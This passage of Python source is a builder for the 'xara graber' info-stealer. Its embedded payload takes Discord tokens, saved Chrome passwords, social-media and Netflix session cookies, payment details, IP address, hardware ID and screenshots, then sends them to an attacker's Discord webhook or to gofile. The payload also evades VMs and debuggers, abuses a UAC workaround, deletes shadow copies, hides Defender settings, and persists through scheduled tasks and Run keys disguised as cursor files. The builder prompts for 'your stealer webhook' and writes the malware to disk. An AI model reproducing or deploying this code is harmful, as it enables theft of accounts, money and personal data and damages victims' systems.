                    },
                     "footer": {
                        "text": "GitHub.com/xara-01",
                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                    }
                }
            ]
        }
        fileEmbed = {
            "username": f"xara stealer | v2.0.0",
            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
        }
        with open(_zipfile,'rb') as infozip:
            requests.post(self.webhook, json=embed)
            if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
                infozip.seek(0)
                server = requests.get('https://api.gofile.io/getServer').json()['data']['server']
                link = requests.post(
                    url=f"https://{server}.gofile.io/uploadFile",
                    data={
                        "token": None,
                        "folderId": None,
                        "description": None,
                        "password": None,
                        "tags": None,
                        "expire": None
                },
                files={"upload_file": infozip},
                ).json()["data"]["downloadPage"]
                a = fileEmbed.copy()
                a.update({"content": f"{link}"})
                requests.post(self.webhook, json=a)
        os.remove(_zipfile)
    def forceadmin(self):
        self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
        sys.exit()
    def persist(self):
        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: elevated = False
        if elevated:
            try:
                self.system(f'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul')
                self.system(f'reagentc /disable >nul')
                self.system(f'vssadmin delete shadows /all /quiet >nul')
                shutil.copy2(sys.argv[0],'C:\\Windows\\Cursors\\')
                os.rename(os.path.join('C:\\Windows\\Cursors',os.path.basename(sys.argv[0]),'C:\\Windows\\Cursors\\cursors.cfg'))
                with open('cursorinit.vbs','w') as f: f.write('\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c C:\\Windows\\Cursors\\cursors.cfg\", 0, True\n')
                self.system(f'schtasks /create /tn "CursorSvc" /sc ONLOGON /tr "C:\\Windows\\Cursors\\cursorinit.vbs" /rl HIGHEST /f >nul')
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
            except Exception: self.exceptions.append(traceback.format_exc())
        elif (elevated == False) and (os.getcwd() != os.path.join(self.roaming,'Cursors')):
            try:
                try: shutil.rmtree(os.path.join(self.roaming,'Cursors'))
                except Exception: pass
                os.makedirs(self.roaming+'\\Cursors', 0x1ED, exist_ok=True)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
                shutil.copy2(sys.argv[0],os.path.join(self.roaming,'Cursors\\'))
                os.rename(os.path.join(self.roaming,'Cursors\\',os.path.basename(sys.argv[0])),os.path.join(self.roaming,'Cursors\\cursors.cfg',))
                binp = "Cursors\\cursors.cfg"
                initp = "Cursors\\cursorinit.vbs"
                with open(os.path.join(self.roaming,'Cursors\\cursorinit.vbs'),'w') as f: f.write(f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(self.roaming,binp)}\'\", 0, True\n')
                self.system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(self.roaming,initp)}" /f >nul')
            except Exception: self.exceptions.append(traceback.format_exc())
def handler():
    try: ticks(0x0000000000F)
    except Exception: pass
    internal.stolen = True
    if config.get('keep-alive'):
        while True:
            time.sleep(random.randrange(3400,3800))
            try: ticks(0x0000000000F)
            except Exception: pass
def stabilizeTicks():
    if config['antivm']:
        if os.path.exists('D:\\Tools') or os.path.exists('D:\\OS2') or os.path.exists('D:\\NT3X'): return
        if ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False): return
        for process in psutil.process_iter():
            if process.name() in ["ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"]: return
        if os.getlogin() in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe"]: return
        if functions.system(functions, r'wmic path win32_VideoController get name').splitlines()[1] in ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter","NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK","Стандартный VGA графический адаптер",]: return
        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]) <= 50: return
    if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    try: handler()
    except Exception: pass

ticks.starttime = time.time()
if __name__ == "__main__": stabilizeTicks()

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import time
from shutil import copy
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from PIL import ImageGrab


webhook = '""" + webhook + r"""'


tokens = []
cleaned = []
checker = []


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = True
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        pfp=res_json['avatar']
                        if pfp==None:
                            pfp='https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png'
                        else:
                            pfp=f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}"
                        


                        embed = {
                            "username": f"xara Graber | v4.0.0",
                            "content": "@everyone",
                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "xara Graber | strikes again !",
                                        "url": "https://discord.gg/WajMeYnsAa ",
                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
                                    },
                                    "description": f'   🕷   \n <a:1441:1038453373239820328>**・__Username__** ```{user_name} | {user_id}```\n<a:uzi:1032752999795265537>**・__ip__** ```{ip}```\n <a:Bat:1032747993981538395>**・__email__** ```{email}```\n <a:dt:1032744237042774057>**・__Phone Number__** ```{phone}```\n              <a:earth:1026630605619855450>・**__2FA__**: {mfa_enabled}                                <a:diamond:1032752566926315575>・**__Nitro__**: {has_nitro}               \n\n**                                            <a:Cc:1032742457416355882>・__Tokens__**\n ```{tok}``` \n',
                                    "color": 0x070707,
                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                    "thumbnail": {
                                      "url": f"{pfp}"
                                    },
                                     "footer": {
                                        "text": "GitHub.com/xara-01",
                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                    }
                }
            ]
        }


                        fileEmbed = {
                            "username": f"xara Graber | v4.0.0",
                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
        }

        requests.post(webhook, json=embed)

if __name__ == '__main__':
    get_token()


website = ['discord.com', 'twitter.com', 'instagram.com', 'netflix.com', 'gmail.com', 'github.com']
IPv4 =urlopen(Request("https://api.ipify.org")).read().decode().strip()

def get_screenshot(path):
    get_screenshot.scrn = screenshot()
    get_screenshot.scrn_path = os.path.join(
        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
    get_screenshot.scrn.save(get_screenshot.scrn_path)


def get_hwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def get_user_data(tk):
    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me',
                   headers=headers).json()
    return [response['username'], response['discriminator'],
            response['email'], response['phone']]


def has_payment_methods(tk):
    headers = {'Authorization': tk}
    response = get(
        'https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
    return response


def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox",
                "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cookies.append(
                str(getattr(browser_cookie3, browser)(domain_name=u)))
        except BaseException:
            pass
    return cookies


def get_Personal_data():
    try:
        ip_address = urlopen(
            Request('https://api64.ipify.org')).read().decode().strip()
        country = urlopen(
            Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
        city = urlopen(
            Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
    except BaseException:
        city = "City not found :expressionless:"
        country = "Country not found :expressionless:"
        ip_address = "No IP found :expressionless:"
    return [ip_address, country, city]


def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    for his in get_history().histories:
        a, b = his
        if len(b) <= 100:
            table.add_row([a, b])
        else:
            x_ = b.split("//")
            x__, x___ = x_[1].count('/'), x_[1].split('/')
            if x___[0] != 'www.google.com':
                if x__ <= 5:
                    b = f"{x_[0]}//"
                    for p in x___:
                        if x___.index(p) != len(x___) - 1:
                            b += f"{p}/"
                    if len(b) <= 100:
                        table.add_row([a, b])
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                else:
                    b = f"{x_[0]}//{x___[0]}/[...]"
                    if len(b) <= 100:
                        table.add_row([a, b])
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
    return table.get_string()


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[
                              5:], None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(
            data[15:])[:-16].decode()
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""


def main(dirpath):
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    chrome_psw_list = []
    if os.path.exists(db_path):
        key = get_encryption_key()
        filename = os.path.join(dirpath, "ChromeData.db")
        copyfile(db_path, filename)
        db = connect(filename)
        cursor = db.cursor()
        cursor.execute(
            'SELECT origin_url, username_value, password_value FROM logins')
        chrome_psw_list = []
        for url, user_name, pwd in cursor.fetchall():
            pwd_db = decrypt_data(pwd, key)
            if pwd_db:
                chrome_psw_list.append([user_name, pwd_db, url])
        cursor.close()
        db.close()
    for w in website:
        if w == website[0]:
            tokens = []

            def discord_tokens(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith(
                            '.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(
                            f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (
                                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)

            paths = [
                os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome",
                             "User Data", "Default", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Discord",
                             "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'),
                             "Opera Software", "Opera Stable"),
                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware",
                             "Brave-Browser", "User Data", "Default"),
                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex",
                             "YandexBrowser", "User Data", "Default"),
                os.path.join(os.getenv('APPDATA'), "discordptb"),
                os.path.join(os.getenv('APPDATA'), "discordcanary"),
            ]
            threads = []

            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))

            for j in paths:
                find_wb(j)
            for t in threads:
                t.start()
                t.join()
        elif w == website[1]:
            t_cookies, t_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                t_cookies.append(b.split(', '))
            for c in t_cookies:
                for y in c:
                    if search(r"auth_token", y) is not None:
                        t_lst.append(y.split(' ')[1].split("=")[1])
        elif w == website[2]:
            insta_cookies, insta_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                insta_cookies.append(b.split(', '))
            browser_ = defaultdict(dict)
            for c in insta_cookies:
                if all([search(r"ds_user_id", str(c)) is not None,
                       search(r"sessionid", str(c)) is not None]):
                    for y in c:
                        conditions = [search(r"ds_user_id", y) is not None, search(
                            r"sessionid", y) is not None]
                        if any(conditions):
                            browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[
                                1].split("=")[1]
            for x in list(dict(browser_).keys()):
                insta_lst.append(list(dict(browser_)[x].items()))
            for x in insta_lst:
                for y in x:
                    if x.index(y) != y[0]:
                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
            for x in insta_lst:
                for y in x:
                    x[x.index(y)] = y[1]
        elif w == website[3]:
            n_cookies, n_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                n_cookies.append(b.split(', '))
            for c in n_cookies:
                for y in c:
                    if search(r"NetflixId", y) is not None:
                        data = y.split(' ')[1].split("=")[1]
                        if len(data) > 80:
                            n_lst.append([])
                            for y in c:
                                n_lst[-1].append({'domain': f"{website[3]}", "name": f"{y.split(' ')[1].split('=')[0]}",
                                                 "value": f"{y.split(' ')[1].split('=')[1]}"})
    all_data_p = []
    for x in tokens:
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]['type'] == 1:
                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]
                                ['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]['type'] == 2:
                    writable_2 = [lst_b[n]['email'], lst_b[n]
                                  ['type'], lst_b[n]['billing_address']]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except BaseException:
            pass
    return [tokens, list(set(t_lst)), list(set(tuple(element)
                                               for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]


def send_webhook(DISCORD_WEBHOOK_URLs):
    p_lst = get_Personal_data()
    cpuinfo = get_cpu_info()
    with TemporaryDirectory(dir='.') as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        get_screenshot(path=td)
        main_info = main(td)
        discord_T, twitter_T, insta_T, chrome_Psw_t = (
            PrettyTable(padding_width=1) for _ in range(4))
        discord_T.field_names, twitter_T.field_names, insta_T.field_names, chrome_Psw_t.field_names, verified_tokens = [
            "Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], ['Username / Email', 'password', 'website'], []
        for __t in main_info[4]:
            chrome_Psw_t.add_row(__t)
        for t_ in main_info[0]:
            try:
                lst = get_user_data(t_)
                username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
                discord_T.add_row([t_, username, email, phone])
                verified_tokens.append(t_)
            except BaseException:
                pass
        for _t in main_info[1]:
            twitter_T.add_row([_t])
        for _t_ in main_info[2]:
            insta_T.add_row(_t_)
        pay_l = []
        for _p in main_info[3]:
            if _p[1] == 1:
                payment_card = PrettyTable(padding_width=1)
                payment_card.field_names = [
                    "Brand", "Last 4", "Type", "Expiration", "Billing Adress"]
                payment_card.add_row(
                    [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
                pay_l.append(payment_card.get_string())
            elif _p[1] == 2:
                payment_p = PrettyTable(padding_width=1)
                payment_p.field_names = ["Email", "Type", "Billing Adress"]
                payment_p.add_row([_p[0], "Paypal", _p[2]])
                pay_l.append(payment_p.get_string())
        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [
            os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t]]
        for x_, y_ in files_names:
            if (y_ == files_names[0][1] and len(main_info[0]) != 0) or (y_ == files_names[1][1] and len(main_info[1]) != 0) or (
                    y_ == files_names[2][1] and len(main_info[2]) != 0) or (y_ == files_names[3][1] and len(main_info[4]) != 0):
                with open(x_, 'w') as wr:
                    wr.write(y_.get_string())
        all_files = [os.path.join(
            td, 'History.txt'), get_screenshot.scrn_path, os.path.join(td, "Payment Info.txt")]
        for n in main_info[5]:
            p = os.path.join(td, f'netflix_{main_info[5].index(n)}.json')
            with open(p, 'w') as f:
                f.write(dumps(n, indent=4))
            all_files.append(p)
        with open(all_files[0], 'w') as f:
            f.write(find_His())
        with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
            if ('payment_card' or 'payment_p') in locals():
                with open(all_files[2], 'w') as f:
                    for i in pay_l:
                        f.write(f"{i}\n")
            for files_path in all_files:
                try:
                    zip.write(files_path)
                except FileNotFoundError:
                    pass
            for name_f, _ in files_names:
                if os.path.exists(name_f):
                    zip.write(name_f)
        for URL in DISCORD_WEBHOOK_URLs:
            webhook = DiscordWebhook(url=URL, username='Cookie Grabber - By xara',
                                     avatar_url="https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png")
            embed = DiscordEmbed(title='⭐ Cookie Grabber strike ! ⭐', color='0x00000F')
            embed.add_embed_field(
                name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
            embed.add_embed_field(
                name='IP USER INFO', value=f":eyes:`IPv4:` **{IPv4}**\n:eyes:`IPv6:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n\n", inline=False)
            embed.add_embed_field(
                name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n\n", inline=False)
            embed.add_embed_field(
                name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:green_circle:`Netflix:` **{len(main_info[5])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n\n", inline=False)
            card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals(
            ) else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
            embed.add_embed_field(
                name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}\n", inline=False)
            embed.set_footer(text='GitHub.com/xara-01', icon_url='https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png')
            embed.set_timestamp()
            with open(os.path.join(td, "data.zip"), 'rb') as f:
                webhook.add_file(
                    file=f.read(), filename=f"Cookie-of-{os.getenv('UserName')}.zip")
            webhook.add_embed(embed)
            webhook.execute()


if __name__ == "__main__":
    freeze_support()
    if len(sys.argv) == 1:
        send_webhook(['""" + webhook + r"""'])
    else:
        del sys.argv[0]
        send_webhook(sys.argv)

"""








class grab:
    def grab(self) -> None:
        self.content = Make.grab(webhook=self.webhook)
        return None
        



class Build(grab):
    def __init__(self, webhook: str) -> None:
        self.file, self.webhook, self.content, self.key = "build/xaraGraber.py", webhook, ..., ...
        self.build()
        return None

    def build(self) -> None:
        self.grab()
        self.folder()
        self.save()
        return None

    
    def folder(self) -> None:
        if isdir('build'):
            rmtree('build')
        mkdir('build')
        return None


    def save(self) -> None:
        with open(self.file, mode='w', encoding='utf-8') as f:
            f.write(self.content)
        return None





banner1 = """
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |                 |  |  |     |         |      |
     |  | C:\>_xara graber|  |  |/----|`---=    |      |
     |  |     builder     |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'                                             
"""[1:].replace('M', '0')


banner2 = """
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |                 |  |  |     |         |      |
     |  | C:\>_xara graber|  |  |/----|`---=    |      |
     |  |     builder     |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'                                             
"""[1:].replace('m','0')


banner = choice((banner1, banner2))


ascii = '''
                                                                           /$$                          
                                                                          | $$                          
 /$$   /$$  /$$$$$$   /$$$$$$  /$$$$$$         /$$$$$$   /$$$$$$  /$$$$$$ | $$$$$$$   /$$$$$$   /$$$$$$ 
|  $$ /$$/ |____  $$ /$$__  $$|____  $$       /$$__  $$ /$$__  $$|____  $$| $$__  $$ /$$__  $$ /$$__  $$
 \  $$$$/   /$$$$$$$| $$  \__/ /$$$$$$$      | $$  \ $$| $$  \__/ /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
  >$$  $$  /$$__  $$| $$      /$$__  $$      | $$  | $$| $$      /$$__  $$| $$  | $$| $$_____/| $$      
 /$$/\  $$|  $$$$$$$| $$     |  $$$$$$$      |  $$$$$$$| $$     |  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  \__/ \_______/|__/      \_______/       \____  $$|__/      \_______/|_______/  \_______/|__/      
                                              /$$  \ $$                                                 
                                             |  $$$$$$/                                                 
                                              \______/                                                  
'''[1:]


def init():
    System.Clear()
    System.Title("xara graber - Builder")
    System.Size(120, 30)
    Anime.Fade(text=Center.Center(banner2), color=Colors.purple_to_blue, mode=Colorate.Diagonal, enter=True)


def main():
    System.Clear()
    print('\n'*2)
    print(Colorate.Horizontal(Colors.purple_to_blue, Center.XCenter(ascii)))
    print('\n'*3)
    webhook = Write.Input("Enter your stealer webhook -> ", 
            Colors.purple_to_blue, interval=0.005, input_color=Colors.white)


    if not webhook.strip():
        Colorate.Error("Please enter a valid webhook!")
        return
    

    Build(webhook=webhook)

    print()
    Write.Input("Built!", Colors.purple_to_blue, interval=0.005)
    return exit()



if __name__ == '__main__':
    init()
    while True:
        main()

